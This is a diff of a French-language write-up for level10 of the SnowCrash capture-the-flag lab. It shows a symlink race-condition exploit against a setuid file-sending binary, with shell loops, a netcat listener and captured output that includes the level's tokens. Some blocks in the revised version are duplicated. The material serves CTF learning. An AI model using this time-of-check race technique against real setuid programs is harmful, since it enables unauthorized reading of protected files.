@@ -20,6 +20,7 @@ level10@SnowCrash:~$ ./level10
 ./level10 file host
         sends file to host if you have access to it
 ```
+
 "./level10 file host" signifie que l'on doit mettre file et host en tant que parametre
 
 </br></br>
@@ -107,84 +108,46 @@ donc, on va executer token en utilisant race condition et symbolic link
 
 </br></br>
 
-## symbolic link et race condition
-
-faire fichier link
-ce fichier est symbolic link pour open (level10) et pour executer (token)
-
-```zsh
-level10@SnowCrash:$ mkdir /tmp/link
-level10@SnowCrash:$ cd /tmp/link
-level10@SnowCrash:/tmp/link$ vim makeSymLink.sh
-level10@SnowCrash:/tmp/link$ ls
-makeSymLink.sh
-level10@SnowCrash:/tmp/link$ chmod +x ./makeSymLink.sh
-level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
-```
-
-```sh
-#!/bin/bash
-
-while true
-do
-  ln -fs ~/level10 ./link
-  ln -fs ~/token ./link
-done
-```
-
-</br></br>
-
 ## execute
 
 ```zsh
-level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
-level10@SnowCrash:/tmp/link$ while true; do ./level10 /tmp/link/link localhost; done
-```
-
-```zsh
-Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
-You don't have access to /tmp/link/link
-Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
-Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
-You don't have access to /tmp/link/link
-Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
-You don't have access to /tmp/link/link
-You don't have access to /tmp/link/link
-Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
-You don't have access to /tmp/link/link^C
-```
-
-```zsh
+level10@SnowCrash:~$ touch /tmp/level10
+level10@SnowCrash:~$ ln -s ~/token /tmp/link
 level10@SnowCrash:~$ nc -lk 6969
-Connected!
-Sending file .. Damn. Unable to open fileUnable to read from file: %s
-wrote file!You don't have access to %s
-0����Lx���p��������������zR|
-                            P���F
-                                 J
-��                                tx?;*2$"@�����B
-  8`|���a�A
-           �A�A�N0JA�A
-                      ��A�������������������
-���o�Ё                                      Є
-�
- ��H������o���o�(.*( )*.
-woupa2yuojeeaaed06riuj63c
+level10@SnowCrash:~$ nc -lk 6969
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
 .*( )*.
 woupa2yuojeeaaed06riuj63c
 .*( )*.
-woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
 .*( )*.
 ```
 
-</br></br>
+```zsh
+level10@SnowCrash:~$ while true; do ln -sf /tmp/level10 /tmp/link; ln -sf ~/token /tmp/link; done
+```
 
-## get token
+```zsh
+level10@SnowCrash:~$ while true; do ln -sf /tmp/level10 /tmp/link; ln -sf ~/token /tmp/link; done
+```
 
 ```zsh
 level10@SnowCrash:~$ su flag10
 Password:
-Don't forget to launch getflag !
+getDon't forget to launch getflag !
 flag10@SnowCrash:~$ getflag
 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 flag10@SnowCrash:~$ su level11
